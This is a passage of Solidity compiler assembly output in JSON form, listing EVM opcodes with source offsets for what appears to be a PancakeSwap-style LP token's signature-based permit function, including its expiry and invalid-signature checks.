											"name": "ADD"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MSTORE"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP1"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP2"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MSTORE"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B42432D4C5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "D4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP2"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MSTORE"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "POP"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP2"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "JUMPDEST"
										},
										{
											"begin": 3068,
											"end": 3072,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3084,
											"end": 3116,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 3094,
											"end": 3104,
											"name": "CALLER"
										},
										{
											"begin": 3106,
											"end": 3108,
											"name": "DUP5"
										},
										{
											"begin": 3110,
											"end": 3115,
											"name": "DUP5"
										},
										{
											"begin": 3084,
											"end": 3093,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 3084,
											"end": 3116,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "tag",
											"value": "60"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMPDEST"
										},
										{
											"begin": 3730,
											"end": 3745,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3718,
											"end": 3726,
											"name": "DUP5"
										},
										{
											"begin": 3718,
											"end": 3745,
											"name": "LT"
										},
										{
											"begin": 3718,
											"end": 3745,
											"name": "ISZERO"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH [tag]",
											"value": "76"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "JUMPI"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP2"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP3"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP3"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E8811561412549151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "82"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP3"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MLOAD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP2"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SUB"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "REVERT"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "tag",
											"value": "76"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "JUMPDEST"
										},
										{
											"begin": 3878,
											"end": 3894,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3878,
											"end": 3894,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP10"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "AND"
										},
										{
											"begin": 3776,
											"end": 3790,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP2"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP2"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "MSTORE"
										},
										{
											"begin": 4115,
											"end": 4121,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "SWAP1"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP2"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "MSTORE"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP4"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "KECCAK256"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SLOAD"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP3"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "ADD"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SWAP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SWAP3"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP3"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 748,
											"end": 814,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP2"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP5"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP14"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "AND"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP13"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP12"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP2"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP7"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP3"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "DUP1"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "MLOAD"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "SWAP1"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "DUP4"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "ADD"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "KECCAK256"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1901"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "102"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP6"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "122"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP6"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP6"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP7"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP7"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "142"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP5"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP3"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "DUP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "MLOAD"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "DUP4"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "ADD"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP1"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "KECCAK256"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP6"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP4"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "162"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP5"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP7"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP10"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "AND"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "182"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP6"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "1A2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP5"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP9"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "1C2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP5"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP8"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MLOAD"
										},
										{
											"begin": 3776,
											"end": 3790,
											"name": "SWAP2"
										},
										{
											"begin": 3776,
											"end": 3790,
											"name": "SWAP4"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SWAP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "1E2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SUB"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP6"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "GAS"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "STATICCALL"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MLOAD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "DUP2"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "AND"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "ISZERO"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "DUP1"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "ISZERO"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "SWAP1"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "JUMPI"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "POP"
										},
										{
											"begin": 4376,
											"end": 4381,
											"name": "DUP9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4356,
											"end": 4381,
											"name": "AND"
										},
										{
											"begin": 4356,
											"end": 4372,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4356,
											"end": 4381,
											"name": "AND"
										},
										{
											"begin": 4356,
											"end": 4381,
											"name": "EQ"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "JUMPDEST"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH [tag]",
											"value": "79"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "JUMPI"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP2"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP3"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "1A"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP3"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F5349474E4154555245000000000000"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP3"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MLOAD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP2"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SUB"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "REVERT"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "tag",
											"value": "79"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "JUMPDEST"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 4452,
											"end": 4457,
											"name": "DUP10"
										},
										{
											"begin": 4459,
											"end": 4466,
											"name": "DUP10"
										},
										{
											"begin": 4468,
											"end": 4473,
											"name": "DUP10"
										},
										{
											"begin": 4443,
											"end": 4451,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "JUMPDEST"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP3"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP4"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP5"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "KECCAK256"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP2"
										},
										{
											"begin": 431,
											"end": 495,
